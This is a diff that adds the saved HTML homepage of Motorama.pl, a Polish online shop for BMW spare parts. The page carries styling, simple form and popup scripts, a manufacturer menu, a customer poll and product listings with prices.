@@ -1,0 +1,264 @@
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2"><title>Motorama.pl - Sklep z częściami do samochodów marki BMW</title>
+<style type="text/css">
+<!--
+BODY {
+	margin-top: 10;
+	margin-bottom: 10;
+	margin-left: 10;
+	margin-right: 10;
+	COLOR: #000000;
+	FONT-SIZE: 11px;
+	FONT-FAMILY: verdana, geneva, arial, Arial;
+	FONT-WEIGHT: normal;
+}
+
+TABLE {
+	COLOR: #000000;
+	FONT-SIZE: 11px;
+	FONT-FAMILY: verdana, geneva, arial, Arial;
+	FONT-WEIGHT: normal;
+}
+
+.tabela-normal {
+	BORDER-COLLAPSE: collapse;
+	BORDER: 0px;
+}
+
+.komorka-normal {
+	SPACING: 0;
+	PADDING: 0;
+	BORDER: 1px solid #215DC6;
+}
+
+.komorka-naglowek {
+	SPACING: 0;
+	PADDING: 0;
+	BORDER: 1px solid #215DC6;
+	}
+
+.komorka-odstep {
+	SPACING: 0;
+	PADDING: 0;
+	HEIGHT: 13px;
+	BORDER: 0px;
+	}
+
+.kolor-11 {
+	COLOR: #2A2A2A;
+	FONT-WEIGHT: bold;}
+
+.kolor-12 {
+	COLOR: #BD0000;
+}
+
+.kolor-13 {
+	COLOR: #2A2A2A;
+}
+
+.pogrubienie {
+	FONT-WEIGHT: bold;
+}
+
+.pochylenie {
+	FONT-STYLE: italic;
+}
+
+.podkreslenie {
+	TEXT-DECORATION: underline;
+}
+
+.trzynastka {
+	FONT-SIZE: 13px;
+}
+
+A:Visited {
+	COLOR: #215DC6;
+	TEXT-DECORATION: underline;
+	FONT-WEIGHT: normal;
+}
+
+A:Link {
+	COLOR: #215DC6;
+	TEXT-DECORATION: underline;
+	FONT-WEIGHT: normal;
+}
+
+A:Hover {
+	COLOR: #BD0000;
+	TEXT-DECORATION: none;
+	FONT-WEIGHT: normal;
+}
+
+A.naglowek:Visited {
+	COLOR: #2A2A2A;
+	TEXT-DECORATION: underline;
+	FONT-WEIGHT: normal;
+}
+
+A.naglowek:Link {
+	COLOR: #2A2A2A;
+	TEXT-DECORATION: underline;
+	FONT-WEIGHT: normal;
+}
+
+A.naglowek:Hover {
+	COLOR: #215DC6;
+	TEXT-DECORATION: none;
+	FONT-WEIGHT: normal;
+}
+
+INPUT.text {
+	BORDER: #215DC6 1px solid;
+	FONT-SIZE: 10pt;
+	FONT-FAMILY: Arial;
+	COLOR: #000000;
+	BACKGROUND-COLOR: #EAEFFC;
+	MARGIN: 1;
+}
+	
+INPUT.button {
+	BORDER-TOP: #CECECE 1px solid;
+	BORDER-LEFT: #CECECE 1px solid;
+	BORDER-BOTTOM: #215DC6 1px solid;
+	BORDER-RIGHT: #215DC6 1px solid;
+	FONT-SIZE: 10pt;
+	FONT-FAMILY: Arial;
+	COLOR: #000000;
+	BACKGROUND-COLOR: #EAEFFC;
+	HEIGHT: 21px;
+}
+
+SELECT {
+	FONT-SIZE: 10pt;
+	FONT-FAMILY: Arial;
+	COLOR: #000000;
+	BACKGROUND-COLOR: #EAEFFC}
+
+TEXTAREA {
+	BORDER: #215DC6 1px solid;
+	FONT-SIZE: 10pt;
+	FONT-FAMILY: Arial;
+	COLOR: #000000;
+	BACKGROUND-COLOR: #EAEFFC;
+}
+
+body {
+	SCROLLBAR-FACE-COLOR: #EAEFFC;
+	SCROLLBAR-HIGHLIGHT-COLOR: #FFFFFF;
+	SCROLLBAR-3DLIGHT-COLOR: #FFFFFF;
+	SCROLLBAR-SHADOW-COLOR: #215DC6;
+	SCROLLBAR-DARKSHADOW-COLOR: #FFFFFF;
+	SCROLLBAR-ARROW-COLOR: #215DC6;
+	SCROLLBAR-TRACK-COLOR: #FFFFFF;
+}
+
+-->
+</style>
+
+<SCRIPT type="text/javascript">
+<!--
+function flip(rid)
+{
+current=(document.getElementById(rid).style.display == 'none') ? 'block' : 'none';
+document.getElementById(rid).style.display = current;
+}
+
+function wyswietl_formularze(){
+	flip('na_firme');
+	flip('teleadr_firma');
+}
+
+function przesylka(numer){
+	
+	if(numer!="empty"){
+		self.location.href = "index.php?d=koszyk&action=zam&forma_przesylki=" + numer + "&PHPSESSID=cdb8e5987f71c8ae5d7fff5eed68c6de";
+	}
+	else{
+		self.location.href = "index.php?d=koszyk&action=zam&PHPSESSID=cdb8e5987f71c8ae5d7fff5eed68c6de";
+	}
+}
+
+function czysc_dane_personalne(){
+	if(document.form_zamowienie.firma.value != '' || document.form_zamowienie.nip.value != ''){
+		document.form_zamowienie.imie.value = '';
+		document.form_zamowienie.nazwisko.value = '';
+	}
+}
+
+function czysc_dane_firmy(){
+	if(document.form_zamowienie.imie.value != '' || document.form_zamowienie.nazwisko.value != ''){
+		document.form_zamowienie.firma.value = '';
+		document.form_zamowienie.nip.value = '';
+	}
+}
+-->
+</SCRIPT>
+
+<SCRIPT type="text/javascript">
+<!--
+function Laduj(obraz, szerokosc){
+
+if (obraz!=""){
+document.IMG.width = szerokosc;
+document.IMG.src = "galerie/" + obraz + "_m.jpg";
+}
+
+if (obraz==""){
+document.IMG.src = "img/podglad.gif";
+}
+} 
+-->
+</SCRIPT>
+
+
+<script type="text/javascript">
+<!--
+function okno(url, przewijanie, width, height) {
+	window.open(url, 'okienko', 'width='+width+',height='+height+',status=no,scrollbars='+przewijanie+',resize=no,menubar=no');
+}
+-->
+</script>
+
+</head><body background="img/bgb.gif" bgcolor="#F6F8FE" link="#000000" vlink="#000000" alink="#000000" > 
+<div align="center">
+
+<table class="tabela-normal" bgcolor="#FFFFFF" width="770"><tr><td class="komorka-normal" width="100%"><table border="0" width="100%" cellspacing="0" cellpadding="0"><tr><td width="10" rowspan="3"><img alt="" border="0" src="img/pix.gif" width="10" height="1"></td><td height="10"><img alt="" border="0" src="img/pix.gif" width="1" height="10"></td><td width="10" rowspan="3"><img alt="" border="0" src="img/pix.gif" width="10" height="1"></td></tr><tr><td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0"><tr><td width="100%"><object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,0,0" width="770" height="155" id="top" align="middle">
+<param name="allowScriptAccess" value="sameDomain" />
+<param name="movie" value="top.swf" />
+<param name="quality" value="high" />
+<param name="bgcolor" value="#ffffff" />
+<embed src="top.swf" quality="high" bgcolor="#ffffff" width="770" height="155" name="top" align="middle" allowScriptAccess="sameDomain" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" />
+</object></td></tr><tr><td><table class="tabela-normal" width="100%"><tr><td valign="top" class="komorka-naglowek" width="100%" bgcolor="#EAEFFC">
+
+<table border="0" width="100%" cellspacing="0" cellpadding="0"><tr><td width="70%"><div class="kolor-13" style="margin: 5"><a class="naglowek" href="index.php"><span class="pogrubienie">Strona Główna</span></a> | <a class="naglowek" href="index.php?d=katalog"><span class="pogrubienie">Katalog Produktów</span></a> | <a class="naglowek" href="index.php?d=promocje"><span class="pogrubienie">Promocje</span></a> | <a class="naglowek" href="index.php?d=koszyk"><span class="pogrubienie">Koszyk</span></a> | <a class="naglowek" href="index.php?d=informacje&id=1"><span class="pogrubienie">Części używane</span></a></div></td><td width="30%"><div class="kolor-13" align="right" style="margin: 5">
+
+<a class="naglowek" href="index.php?d=login"><span class="pogrubienie">Logowanie</span></a> | <a class="naglowek" href="index.php?d=rejestracja"><span class="pogrubienie">Rejestracja</span></a>
+
+</div></td></tr></table>
+
+</td></tr><tr><td class="komorka-normal" width="100%" bgcolor="#E5E5E5"><table border="0" width="100%" cellspacing="0" cellpadding="0"><tr><td width="5" rowspan="3"><img alt="" border="0" src="img/pix.gif" width="5" height="1"></td><td height="3"><img alt="" border="0" src="img/pix.gif" width="1" height="3"></td><td width="5" rowspan="3"><img alt="" border="0" src="img/pix.gif" width="5" height="1"></td></tr><tr><td><table border="0" width="100%" cellspacing="0" cellpadding="0"><tr><td></td></tr></table></td></tr><tr><td height="3"><img alt="" border="0" src="img/pix.gif" width="1" height="3"></td></tr></table></td></tr></table><table width="100%" class="tabela-normal"><tr><td class="komorka-odstep"></TD></TR></TABLE></td></tr>
+
+<tr><td width="100%"><div align="center" style="margin-left: 10; margin-right: 10; margin-bottom: 10">Witamy na stronie sklepu internetowego prowadzonego przez firmę MOTORAMA.<br>Firma MOTORAMA jest dystrybutorem części zamiennych do samochodów marki BMW. Jeżeli chcą Państwo dokonać zakupów prosimy się <a href="http://www.motorama.pl/index.php?d=login">zalogować</a>. Możecie Państwo również założyć u nas <a href="http://www.motorama.pl/index.php?d=rejestracja">konto</a> aby dołączyć do grona naszych stałych klientów. Życzymy miłego pobytu i udanych zakupów w naszym sklepie internetowym.</DIV></td></tr><tr><td width="100%"><table align="right" border="0" width="100%" cellspacing="0" cellpadding="0"><tr><td valign="top" width="190"><table class="tabela-normal" width="190"><tr><td class="komorka-naglowek" width="100%" bgcolor="#EAEFFC" valign="top"><div class="kolor-11" style="margin-left: 6; margin-top: 2; margin-bottom: 2">Główne kategorie</div></td></tr><tr><td class="komorka-normal" width="100%" bgcolor="#FFFFFF"><table border="0" width="100%" cellspacing="0" cellpadding="0"><tr><td bgcolor=""><div style="margin-left: 5; margin-right: 5; margin-top: 3; margin-bottom: 3">Seria 1</div></td></tr><tr><td bgcolor="#E5E5E5"><div style="margin-left: 5; margin-right: 5; margin-top: 3; margin-bottom: 3"><A HREF="index.php?d=katalog&k_id=16">Seria 3</a></div></td></tr><tr><td bgcolor=""><div style="margin-left: 5; margin-right: 5; margin-top: 3; margin-bottom: 3"><A HREF="index.php?d=katalog&k_id=17">Seria 5</a></div></td></tr><tr><td bgcolor="#E5E5E5"><div style="margin-left: 5; margin-right: 5; margin-top: 3; margin-bottom: 3">Seria 6</div></td></tr><tr><td bgcolor=""><div style="margin-left: 5; margin-right: 5; margin-top: 3; margin-bottom: 3"><A HREF="index.php?d=katalog&k_id=19">Seria 7</a></div></td></tr><tr><td bgcolor="#E5E5E5"><div style="margin-left: 5; margin-right: 5; margin-top: 3; margin-bottom: 3"><A HREF="index.php?d=katalog&k_id=21">Seria 8</a></div></td></tr></table></td></tr></table><table width="100%" class="tabela-normal"><tr><td class="komorka-odstep"></TD></TR></TABLE><table class="tabela-normal" width="190"><tr><td class="komorka-naglowek" width="100%" bgcolor="#EAEFFC" valign="top"><div class="kolor-11" style="margin-left: 6; margin-top: 2; margin-bottom: 2">Wyszukiwarka</div></td></tr><tr><td class="komorka-normal" width="100%" bgcolor="#FFFFFF"><table border="0" width="100%" cellspacing="0" cellpadding="0"><tr><td width="100%"><div align="center" style="margin-left: 5; margin-right: 5; margin-top: 3; margin-bottom: 3"><form action="index.php" method="get"><input TYPE="hidden" name="d" value="szukaj"><input class="text" TYPE="text" name="szukaj" style="width: 140"> <INPUT alt="Szukaj!" TYPE="IMAGE" SRC="img/lupa.gif"><BR><input TYPE="checkbox" name="szukaj_opis" value="1"> Szukaj również w opisie<BR><a HREF="index.php?d=szukaj">Zaawansowane wyszukiwanie</A></div></TD></TR></table></td></tr></form></table><table width="100%" class="tabela-normal"><tr><td class="komorka-odstep"></TD></TR></TABLE><table class="tabela-normal" width="190"><tr><td class="komorka-naglowek" width="100%" bgcolor="#EAEFFC" valign="top"><div class="kolor-11" style="margin-left: 6; margin-top: 2; margin-bottom: 2">Wybrany Producent</div></td></tr><tr><td class="komorka-normal" width="100%" bgcolor="#FFFFFF"><table border="0" width="100%" cellspacing="0" cellpadding="0"><tr><td width="100%"><div align="center" style="margin-left: 5; margin-right: 5; margin-top: 3; margin-bottom: 3"><form method="get"><input TYPE="hidden" name="d" value="szukaj"><select style="width: 170" onChange="this.form.submit();" size="1" name="producent"><option value="empty">Wybierz producenta</option><option value="38">ABAKUS</option><option value="37">ADLER</option><option value="40">ADRIANTO</option><option value="9">ATE</option><option value="41">AUTOFREN</option><option value="31">BEHR</option><option value="69">BERU</option><option value="1">BMW</option><option value="18">BOSCH</option><option value="60">BREMBO</option><option value="42">CIFAM</option><option value="24">CONTI</option><option value="43">DELPHI</option><option value="27">DEPO</option><option value="11">ELRING</option><option value="64">Embo</option><option value="19">EPS</option><option value="61">EVR</option><option value="44">FAG</option><option value="3">FEBI BILSTEIN</option><option value="36">FEDERAL MOGUL</option><option value="46">FERODO</option><option value="45">FIAMM</option><option value="16">FILTRON</option><option value="47">FISCHER</option><option value="48">FRECCIA</option><option value="49">GABRIEL</option><option value="10">GLASER</option><option value="35">GLYCO</option><option value="12">GOETZE</option><option value="50">GOODYEAR</option><option value="72">GPD</option><option value="70">HANS PRIES</option><option value="29">HELLA</option><option value="5">HEPU</option><option value="21">INA</option><option value="65">IWIS</option><option value="68">JANMOR</option><option value="4">JURID</option><option value="59">KLOKKERHOLM</option><option value="51">KNECHT</option><option value="34">KS</option><option value="52">LEMFOERDER</option><option value="53">LESJOFORS</option><option value="63">LPR</option><option value="66">Magneti Marelli</option><option value="15">MAHLE</option><option value="14">MANN</option><option value="2">MEYLE</option><option value="54">MOOG</option><option value="55">MOTIVE</option><option value="22">NGK</option><option value="6">NK</option><option value="33">OCAP</option><option value="62">Optimal</option><option value="67">P M</option><option value="39">PIMAX</option><option value="30">PM</option><option value="7">REMSA</option><option value="20">SACHS</option><option value="71">SIL</option><option value="23">SKF</option><option value="13">SWAG</option><option value="32">TECNOROT</option><option value="56">TESH</option><option value="8">TEXTAR</option><option value="25">TRW</option><option value="26">TYC</option><option value="57">VALEO</option><option value="58">WAHLER</option><option value="28">ZKW</option></select></div></TD></TR></table></td></tr></form></table><table width="100%" class="tabela-normal"><tr><td class="komorka-odstep"></TD></TR></TABLE><table class="tabela-normal" width="190"><tr><td class="komorka-naglowek" width="100%" bgcolor="#EAEFFC" valign="top"><div class="kolor-11" style="margin-left: 6; margin-top: 2; margin-bottom: 2">Sonda</div></td></tr><tr><td class="komorka-normal" width="100%" bgcolor="#FFFFFF"><div align="center"><table border="0" width="100%" cellspacing="0" cellpadding="0"><tr><td width="100%"><form method="POST" ACTION="sonda.php?id=1"><input TYPE="hidden" name="check_1" value="ok"><div class="pogrubienie" align="center" style="margin: 10">Jak oceniasz nasz nowy sklep ?</div><table border="0" cellpadding="0" cellspacing="0" width="185"><tr><td width="30" align="center"><input TYPE="radio" name="odp" value="1"></td><td><div style="margin-top: 5; margin-bottom: 5">Świetnie, tylko pogratulować</div></td></tr></table><table border="0" cellpadding="0" cellspacing="0" width="185"><tr><td width="30" align="center"><input TYPE="radio" name="odp" value="2"></td><td><div style="margin-top: 5; margin-bottom: 5">Taki sobie, widziałem lepsze</div></td></tr></table><table border="0" cellpadding="0" cellspacing="0" width="185"><tr><td width="30" align="center"><input TYPE="radio" name="odp" value="3"></td><td><div style="margin-top: 5; margin-bottom: 5">Nie podoba mi się</div></td></tr></table><div align="center" style="margin: 10">Wszystkich głosów: <span class="pogrubienie">44</span><BR><BR><input class="button" type="submit" value="Głosuj!"><BR><a href="index.php?d=sondy&id=1">Pokaż wyniki</a><BR><a href="index.php?d=sondy">Zobacz poprzednie sondy</a></div></TD></TR></table></td></tr></form></table><table width="100%" class="tabela-normal"><tr><td class="komorka-odstep"></TD></TR></TABLE>
+<table class="tabela-normal" width="190"><tr><td class="komorka-naglowek" width="100%" bgcolor="#EAEFFC" valign="top"><div class="kolor-11" style="margin-left: 6; margin-top: 2; margin-bottom: 2">Dodatkowe okna - Reklama</div></td></tr><tr><td class="komorka-normal" width="100%" bgcolor="#FFFFFF">Reklamy innych przedsiębiorców,<br /> związanych z motoryzacją.<br /><br />
+Możliwość wprowadzania textu <br />
+<br /><br />
+lub grafiki
+<br /><br />
+</TD></TR></table><table width="100%" class="tabela-normal"><tr><td class="komorka-odstep"></TD></TR></TABLE></td><td valign="top" width="10"><img src="img/pix.gif" width="10" height="1"></td><td valign="top"><table align="right" width="100%" border="0" cellspacing="0" cellpadding="0"><tr><td><table align="center" border="0" width="100%" cellspacing="0" cellpadding="0"><tr><td><table class="tabela-normal" width="100%"><tr><td class="komorka-naglowek" width="100%" bgcolor="#EAEFFC" valign="top"><div class="kolor-11" style="margin-left: 6; margin-top: 2; margin-bottom: 2">Aktualności <a class="naglowek" href="index.php?d=aktualnosci"><span class="pogrubienie">&raquo;</span></a></div></td></tr><tr><td class="komorka-normal" width="100%" bgcolor="#E5E5E5"><div align="justify" style="margin:10"><font SIZE="2"><B>Otwarcie naszego sklepu internetowego</B></FONT><BR><BR>Firma Motorama istnieje na rynku od 1991 r. W <a href="http://www.motorama.pl/index.php?d=katalog">ofercie</a> naszego sklepu znajdziecie Państwo całą gamę części zamiennych do wszystkich modeli samochodów marki <b>BMW</b>.Proponujemy zakup części orginalnych oraz zamienników wysokiej jakości.W naszych magazynach znajdują się części nowe oraz używane. Przed zakupem zachęcamy Państwa do kontaktu telefonicznego lub emailowego ze sprzedawcą w celu ustalenia szczegółowych danych samochodu.<br><br>Zapraszamy<br><br><br /><br><i>Administrator sklepu Motorama.pl</i><br><BR><BR><I>Wiadomość z dnia: 02-10-2005, 19:32</I></DIV></td></tr></table><table width="100%" class="tabela-normal"><tr><td class="komorka-odstep"></TD></TR></TABLE></td></tr>
+
+<tr><td><table class="tabela-normal" width="100%"><tr><td class="komorka-naglowek" width="100%" bgcolor="#EAEFFC" valign="top"><div class="kolor-11" style="margin-left: 6; margin-top: 2; margin-bottom: 2">Najnowsze Propozycje!</div></td></tr><tr><td class="komorka-normal" width="100%" bgcolor="#FFFFFF"><table border="0" width="100%" cellspacing="0" cellpadding="0"><tr><td width="72"></td><td><div class="pogrubienie" style="margin: 5"><span class="podkreslenie">Produkt</span></div></td><td width="90"><div class="pogrubienie" style="margin-left: 5; margin-right: 5; margin-top: 3; margin-bottom: 3" align="center"><span class="podkreslenie">Cena</span></div></td><td width="30"></td></tr><tr><td colspan="4" bgcolor="#215DC6"><img alt="" border="0" src="img/pix.gif" width="1" height="1"></td></tr><tr><td width="72" bgcolor="#E5E5E5" align="center">&nbsp;</td><td bgcolor="#E5E5E5"><div class="trzynastka" style="margin: 5"><A href="index.php?d=produkt&id=302"><span class="pogrubienie">Głowica silnika M30</span></a></div><div style="margin: 5">Producent: <a href="index.php?d=katalog&k_id=3953&p_id=1">BMW</a></div></td><td width="90" bgcolor="#E5E5E5" align="right"><div style="margin-right: 5; margin-top: 3; margin-bottom: 3">800,00 zł</div></td><td width="30" bgcolor="#E5E5E5" align="center"><a HREF="index.php?d=koszyk&action=add&p_id=302"><img alt="Dodaj produkt do koszyka!" border="0" src="img/koszyk.gif"></a></td></tr><tr><td width="72" bgcolor="" align="center">&nbsp;</td><td bgcolor=""><div class="trzynastka" style="margin: 5"><A href="index.php?d=produkt&id=304"><span class="pogrubienie">Głowica silnika M40</span></a></div><div style="margin: 5">Producent: <a href="index.php?d=katalog&k_id=787&p_id=1">BMW</a></div></td><td width="90" bgcolor="" align="right"><div style="margin-right: 5; margin-top: 3; margin-bottom: 3">450,00 zł</div></td><td width="30" bgcolor="" align="center"><a HREF="index.php?d=koszyk&action=add&p_id=304"><img alt="Dodaj produkt do koszyka!" border="0" src="img/koszyk.gif"></a></td></tr><tr><td width="72" bgcolor="#E5E5E5" align="center"><div align="center" style="margin: 5"><table class="tabela-normal" bgcolor="#FFFFFF" width="62" style="height: 62"><tr><td class="komorka-normal" width="62" align="center"><a HREF="Kliknij aby zobaczyć zdjęcie w oryginalnej wielkości!" onclick="javascript:okno('show.php?g=1&szr=800&wys=600&p=8c56dff2947884b98decf61bb2d158b228851', 'yes', 800, 600);return false;"><img style="cursor: hand" title="Kliknij aby zobaczyć zdjęcie w oryginalnej wielkości!" src="img/blank.gif" border="0" width="60" height="8"></A><BR><a HREF="Kliknij aby zobaczyć zdjęcie w oryginalnej wielkości!" onclick="javascript:okno('show.php?g=1&szr=800&wys=600&p=8c56dff2947884b98decf61bb2d158b228851', 'yes', 800, 600);return false;"><img style="cursor: hand" title="Kliknij aby zobaczyć zdjęcie w oryginalnej wielkości!" src="galerie/8c56dff2947884b98decf61bb2d158b228851_k.jpg" border="0" width="60"></a><BR><a HREF="Kliknij aby zobaczyć zdjęcie w oryginalnej wielkości!" onclick="javascript:okno('show.php?g=1&szr=800&wys=600&p=8c56dff2947884b98decf61bb2d158b228851', 'yes', 800, 600);return false;"><img style="cursor: hand" title="Kliknij aby zobaczyć zdjęcie w oryginalnej wielkości!" src="img/blank.gif" border="0" width="60" height="7"></a></td></tr></table></DIV></td><td bgcolor="#E5E5E5"><div class="trzynastka" style="margin: 5"><A href="index.php?d=produkt&id=1"><span class="pogrubienie">Produkt testowy</span></a></div><div align="justify" style="margin: 5">Krótki opis</DIV><div style="margin: 5">Producent: <a href="index.php?d=katalog&k_id=31&p_id=1">BMW</a></div></td><td width="90" bgcolor="#E5E5E5" align="right"><div style="margin-right: 5; margin-top: 3; margin-bottom: 3">100,00 zł</div></td><td width="30" bgcolor="#E5E5E5" align="center"><a HREF="index.php?d=koszyk&action=add&p_id=1"><img alt="Dodaj produkt do koszyka!" border="0" src="img/koszyk.gif"></a></td></tr><tr><td colspan="4" bgcolor="#215DC6"><img alt="" border="0" src="img/pix.gif" width="1" height="1"></td></tr></table><table border="0" width="100%" cellspacing="0" cellpadding="0"><tr><td width="100%"><div style="margin: 5" align="right"><a href="index.php?d=katalog"><span class="pogrubienie">Katalog Produktów &raquo;</span></a></div></td></tr></table></td></tr></table><table width="100%" class="tabela-normal"><tr><td class="komorka-odstep"></TD></TR></TABLE></td></tr>
+</table></TD></TR></table></td><td valign="top" width="10"><img src="img/pix.gif" width="10" height="1"></td><td align="right" valign="top" width="190"><table class="tabela-normal" width="190"><tr><td class="komorka-naglowek" width="100%" bgcolor="#EAEFFC" valign="top"><div class="kolor-11" style="margin-left: 6; margin-top: 2; margin-bottom: 2">Koszyk</div></td></tr><tr><td class="komorka-normal" width="100%" bgcolor="#FFFFFF"><div align="center" style="margin: 5">Twój koszyk jest pusty</div></td></tr></table><table width="100%" class="tabela-normal"><tr><td class="komorka-odstep"></TD></TR></TABLE><table class="tabela-normal" width="190"><tr><td class="komorka-naglowek" width="100%" bgcolor="#EAEFFC" valign="top"><div class="kolor-11" style="margin-left: 6; margin-top: 2; margin-bottom: 2">Subskrypcja</div></td></tr><tr><td class="komorka-normal" width="100%" bgcolor="#FFFFFF"><div align="center" style="margin: 5">Chcesz otrzymywać informacje o nowościach w&nbsp;naszym sklepie?<BR>Wpisz swój adres e-mail!</div><table border="0" width="100%" cellspacing="0" cellpadding="0"><tr><td width="100%"><div align="center" style="margin-left: 5; margin-right: 5; margin-top: 3; margin-bottom: 5"><form name="subskrypcja" action="?d=subskrypcja" method="post"><input class="text" TYPE="text" name="adres_email" style="width: 150"><BR><select name="opcja" size="1" style="width: 150"><option VALUE="wpisz">Wpisz na listę</OPTION><option VALUE="wypisz">Wypisz z listy</OPTION></SELECT><BR><BR><input TYPE="submit" value="Wyślij" class="button" onclick="if(document.subskrypcja.adres_email.value == ''){ alert('Wpisz adres email!'); return false;}"></div></TD></TR></table></td></tr></form></table><table width="100%" class="tabela-normal"><tr><td class="komorka-odstep"></TD></TR></TABLE><table class="tabela-normal" width="190"><tr><td class="komorka-naglowek" width="100%" bgcolor="#EAEFFC" valign="top"><div class="kolor-11" style="margin-left: 6; margin-top: 2; margin-bottom: 2">Najczęściej oglądane</div></td></tr><tr><td class="komorka-normal" width="100%" bgcolor="#FFFFFF"><div align="center"><table border="0" width="100%" cellspacing="0" cellpadding="0"><tr><td bgcolor=""><div style="margin-left: 5; margin-right: 5; margin-top: 3; margin-bottom: 3"><A HREF="index.php?d=produkt&id=3">Klocki Hamulcowe</a></td><td width="75" bgcolor="" align="right"><div style="margin-right: 5; margin-top: 3; margin-bottom: 3">60,00 zł</div></td></tr><tr><td bgcolor="#E5E5E5"><div style="margin-left: 5; margin-right: 5; margin-top: 3; margin-bottom: 3"><A HREF="index.php?d=produkt&id=12">Podpora wału napędowego</a></td><td width="75" bgcolor="#E5E5E5" align="right"><div style="margin-right: 5; margin-top: 3; margin-bottom: 3">95,00 zł</div></td></tr><tr><td bgcolor=""><div style="margin-left: 5; margin-right: 5; margin-top: 3; margin-bottom: 3"><A HREF="index.php?d=produkt&id=24">Łącznik stabilizatora przód</a></td><td width="75" bgcolor="" align="right"><div style="margin-right: 5; margin-top: 3; margin-bottom: 3">76,00 zł</div></td></tr><tr><td bgcolor="#E5E5E5"><div style="margin-left: 5; margin-right: 5; margin-top: 3; margin-bottom: 3"><A HREF="index.php?d=produkt&id=9">Wahacz  P</a></td><td width="75" bgcolor="#E5E5E5" align="right"><div style="margin-right: 5; margin-top: 3; margin-bottom: 3">140,00 zł</div></td></tr><tr><td bgcolor=""><div style="margin-left: 5; margin-right: 5; margin-top: 3; margin-bottom: 3"><A HREF="index.php?d=produkt&id=1">Produkt testowy</a></td><td width="75" bgcolor="" align="right"><div style="margin-right: 5; margin-top: 3; margin-bottom: 3">100,00 zł</div></td></tr><tr><td bgcolor="#E5E5E5"><div style="margin-left: 5; margin-right: 5; margin-top: 3; margin-bottom: 3"><A HREF="index.php?d=produkt&id=49">Atrapa lewa</a></td><td width="75" bgcolor="#E5E5E5" align="right"><div style="margin-right: 5; margin-top: 3; margin-bottom: 3">50,00 zł</div></td></tr><tr><td bgcolor=""><div style="margin-left: 5; margin-right: 5; margin-top: 3; margin-bottom: 3"><A HREF="index.php?d=produkt&id=36">Poduszka gumowa gażnika</a></td><td width="75" bgcolor="" align="right"><div style="margin-right: 5; margin-top: 3; margin-bottom: 3">68,00 zł</div></td></tr></table></td></tr></table><table width="100%" class="tabela-normal"><tr><td class="komorka-odstep"></TD></TR></TABLE><table class="tabela-normal" width="190"><tr><td class="komorka-naglowek" width="100%" bgcolor="#EAEFFC" valign="top"><div class="kolor-11" style="margin-left: 6; margin-top: 2; margin-bottom: 2">Najczęściej kupowane</div></td></tr><tr><td class="komorka-normal" width="100%" bgcolor="#FFFFFF"><div align="center"><table border="0" width="100%" cellspacing="0" cellpadding="0"><tr><td bgcolor=""><div style="margin-left: 5; margin-right: 5; margin-top: 3; margin-bottom: 3"><A HREF="index.php?d=produkt&id=83">Pompa paliwa</a></td><td width="75" bgcolor="" align="right"><div style="margin-right: 5; margin-top: 3; margin-bottom: 3">80,00 zł</div></td></tr><tr><td bgcolor="#E5E5E5"><div style="margin-left: 5; margin-right: 5; margin-top: 3; margin-bottom: 3"><A HREF="index.php?d=produkt&id=49">Atrapa lewa</a></td><td width="75" bgcolor="#E5E5E5" align="right"><div style="margin-right: 5; margin-top: 3; margin-bottom: 3">50,00 zł</div></td></tr></table></td></tr></table><table width="100%" class="tabela-normal"><tr><td class="komorka-odstep"></TD></TR></TABLE></td></tr></table></td></tr><tr><td><table class="tabela-normal" width="100%"><tr><td class="komorka-naglowek" width="100%" bgcolor="#EAEFFC" valign="top"><table border="0" width="100%" cellspacing="0" cellpadding="0"><tr><td width="70%"><div class="kolor-13" style="margin: 5"><a class="naglowek" href="index.php?d=info"><span class="pogrubienie">O sklepie</span></a> | <a class="naglowek" href="index.php?d=regulamin"><span class="pogrubienie">Regulamin</span></a> | <a class="naglowek" href="index.php?d=kontakt"><span class="pogrubienie">Kontakt</span></a> | <a class="naglowek" href="index.php?d=faq"><span class="pogrubienie">FAQ</span></a></div></td><td width="30%"><div class="kolor-13" align="right" style="margin: 5"><span class="pogrubienie">Licznik Odwiedzin: 82714</span></div></TD></table></td></tr><tr><td class="komorka-normal" width="100%" bgcolor="#E5E5E5"><div style="margin-left: 5; margin-right: 5; margin-top: 3; margin-bottom: 3" align="center"><span class="pochylenie"></span></div><div style="margin-left: 5; margin-right: 5; margin-top: 3; margin-bottom: 3" align="center">Aktualna Data: 2009-06-03 15:32</div><div style="margin-left: 5; margin-right: 5; margin-top: 3; margin-bottom: 3" align="center"><span class="13">&copy;</span> Motorama.pl - Sklep z częściami do samochodów marki BMW. Wszelkie Prawa Zastrzeżone. All Rights Reserved.</div><div align="center" style="margin: 5; FONT-SIZE: 10px">Sklep oparty na oprogramowaniu KQS.store.</DIV></td></tr></table>
+
+
+</td></tr></table>
+
+</td></tr><tr><td height="10"><img alt="" border="0" src="img/pix.gif" width="1" height="10"></td></tr></table></td></tr></table>
+</div></body></html>
+
+
+
+
